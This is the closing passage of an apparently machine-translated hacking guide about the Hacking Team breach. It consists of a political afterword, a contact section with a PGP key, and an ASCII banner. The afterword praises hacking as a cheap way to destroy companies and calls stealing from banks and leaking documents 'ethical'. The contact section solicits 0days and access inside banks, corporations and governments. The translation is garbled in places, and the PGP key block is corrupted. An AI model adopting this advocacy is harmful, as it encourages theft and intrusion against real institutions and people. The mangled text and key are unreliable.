It is done. It's that easy to tear down a company and stop its abuses against
human rights. That's the beauty and the asymmetry of hacking: with only one hundred
hours of work, a single person can undo years of work from a
multi-million dollar company. Hacking gives us the possibility to the dispossessed of
fight and win.

Hacking guides usually end with a warning: this information is
just for educational purposes, be an ethical hacker, do not attack computers without
permission, blablablá. I will say the same, but with a more rebellious concept of
"ethical" hacking. It would be ethical hacking to filter documents, expropriate money to
banks, and protect the computers of ordinary people. However, the
Most people who call themselves "ethical hackers" work only
to protect those who pay their consulting fee, which are often the
they deserve to be hacked.

In Hacking Team they see themselves as part of an inspiring tradition
Italian design [1]. I see Vincenzetti, his company, and his cronies from
police, police, and government, as part of a long tradition of
Italian fascism. I want to dedicate this guide to the victims of the assault on
Armando Diaz school, and all those who have shed their blood at the hands of
of Italian fascists.

[1] https://twitter.com/coracurrier/status/618104723263090688


- [18 - Contact] ------------------------------------------- ------------------

To send me spearphishing attempts, death threats written in
Italian [1] [2], and to give me 0days or access inside banks,
corporations, governments etc.

[1] http://andres.delgado.ec/2016/01/15/el-miedo-de-vigilar-a-los-vigilantes/
[2] https://twitter.com/CthulhuSec/status/619459002854977537

only encrypted emails:
https://securityinabox.org/thunderbird_usarenigmail
----- BEGIN PGP PUBLIC KEY BLOCK -----

mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua + bmF2E7OUihTodv4F / N04KKx
vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w / 00JH7UTLcZNbt9WGxtLEs + C + jF9j2g
27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy / TcdWA8x
+ fCM4OHxM4AwkqqbaAtqUwAJ3Wxr + Hr / 3KV + UNV1lBPlGGVSnV + OA4m8XWaPE73h
VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8
Ms3gckaJ30JnPc / qGSaFqvl4pJbx / CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh
Y2tiYWNrQHJpc2V1cC5uZXQ + iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL
BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8 + cr3tac
QdqVNDdp6nbP2rVPW + o3DeTNg0R + 87NAlGWPg17VWxsYoa4ZwKHdD / tTNPk0Sldf
cQE + IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0
JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9 + edsudn341oPB + 7LK7l8vj5Pys
4eauRd / XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh / YiP3MeBzFJX8
X2NYUOYWm3oxiGQohoAn // BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E
VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F / q / HQBYfl4ne3edL2Ai
oHOGg0OMNuhNrs56eLRyB / 6IjM3TCcfn074HL37eDT0Z9p + rbxPDPFOJAMFYyyjm
n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6 + x1nXbiW8sqGEH0a / VdCR3 / CY5F
Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9
WlBP72gPyiWQ / fSUuoM + WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9 + 9e4YUo
jYYjoU4ZuX77iM3 + VWW1J1xJujOXJ / sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK
CRA0nD0R6Kkl0ArYB / 47LnABkz / t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA
OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR
LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh + Gi
JKp0XtOqGF5NH / Zdgz6t + Z8U ++ vuwWQaubMJTRdMTGhaRv + jIzKOiO9YtPNamHRq
Mf2vA3oqf22vgWQbK1MOK / 4Tp6MGg / VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB
D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
= E5 + and
----- END PGP PUBLIC KEY BLOCK -----



                    If not you, who? If not now, when?
                _ _ _ ____ _ _ 
               | | | | __ _ ___ | | __ | __) __ _ ___ | | _ | |
               | | _ | | / _` | / __ | | / / | _ \ / _` | / __ | | / / |
               | _ | (_ | | (__ | <| | _) | (_ | | (__ | <| _ |
               | _ | | _ | \ __, _ | \ ___ | _ | \ _ \ | ____ / \ __, _ | \ ___ | _ | \ _ (_)
